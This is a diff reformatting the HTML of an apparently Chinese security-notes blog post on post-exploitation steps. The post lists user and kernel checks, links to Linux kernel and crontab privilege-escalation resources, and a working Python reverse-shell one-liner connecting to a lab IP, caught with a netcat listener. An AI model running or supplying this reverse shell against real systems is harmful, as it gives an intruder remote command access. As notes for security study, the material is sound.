@@ -62,14 +62,18 @@
 
   <div class="post-content">
     <p><a href="http://www.nisphome.cn/article-detail?id=164" target="_blank" rel="noopener">http://www.nisphome.cn/article-detail?id=164</a></p>
-<h3 id="打扫战场——后门清除与总结"><a href="#打扫战场——后门清除与总结" class="headerlink" title="打扫战场——后门清除与总结"></a>打扫战场——后门清除与总结</h3><ul>
+<h3 id="打扫战场——后门清除与总结">打扫战场——后门清除与总结</h3>
+<ul>
 <li>whoami查看用户名</li>
 <li>cat /proc/version 查看linux版本</li>
-<li>linux内核漏洞提权<br><a href="https://github.com/SecWiki/linux-kernel-exploits" target="_blank" rel="noopener">https://github.com/SecWiki/linux-kernel-exploits</a></li>
-<li>crontab提权    <a href="https://www.freebuf.com/articles/system/175453.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/system/175453.html</a><br>/etc/crontab  定时任务</li>
-<li>简单的反向shell脚本<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> linux上简单的反弹shell</span></span><br><span class="line">python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.167.132",2222));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span><br></pre></td></tr></table></figure>
-用netcat -lvp 2222监听</li>
+<li>linux内核漏洞提权<br>
+<a href="https://github.com/SecWiki/linux-kernel-exploits" target="_blank" rel="noopener">https://github.com/SecWiki/linux-kernel-exploits</a></li>
+<li>crontab提权    <a href="https://www.freebuf.com/articles/system/175453.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/system/175453.html</a><br>
+/etc/crontab  定时任务</li>
+<li>简单的反向shell脚本</li>
 </ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> linux上简单的反弹shell</span></span><br><span class="line">python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.167.132",2222));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span><br></pre></td></tr></table></figure>
+<p>用netcat -lvp 2222监听</p>
 
   </div>
   <div class="post-meta">
